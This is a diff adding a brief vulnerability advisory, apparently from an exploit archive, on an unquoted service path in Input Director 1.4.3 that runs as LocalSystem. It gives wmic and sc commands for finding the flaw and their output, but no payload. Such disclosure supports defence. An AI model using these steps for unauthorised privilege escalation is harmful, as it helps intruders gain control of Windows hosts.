@@ -1,0 +1,37 @@
+# Exploit Title: Input Director 1.4.3 - 'Input Director' Unquoted Service Path
+# Discovery Date: 2020-09-08
+# Response from Input Director Support: 09/09/2020
+# Exploit Author: TOUHAMI Kasbaoui
+# Vendor Homepage: https://www.inputdirector.com/
+# Version: 1.4.3
+# Tested on: Windows Server 2012, Windows 10
+
+# Find the Unquoted Service Path Vulnerability:
+
+C:\wmic service get name,displayname,pathname,startmode | findstr /i "auto"
+| findstr /i /v "c:\windows\\" | findstr /i /v """
+
+Input Director Service  InputDirector  C:\Program Files
+(x86)\InputDirector\IDWinService.exe Auto
+
+# Service info:
+
+C:\sc qc IDWinService
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: InputDirector
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Program Files (x86)\Input
+Director\IDWinService.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Input Director Service
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+
+# Exploit:
+
+A successful attempt to exploit this vulnerability could allow executing
+code during startup or reboot with the elevated privileges.
